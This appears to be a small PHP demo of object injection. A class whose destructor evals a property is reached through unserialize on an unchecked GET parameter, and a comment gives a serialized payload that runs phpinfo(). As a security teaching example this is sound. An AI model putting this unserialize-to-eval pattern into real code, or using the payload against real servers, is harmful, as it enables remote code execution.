<?php

/*
unserialize.php?test=O:7:"Example":1:{s:3:"var";s:10:"phpinfo();";}
*/
	class Example{
		var $var = '';
		function __destruct(){
			eval($this->var);
		}
	}

unserialize($_GET['test']);

?>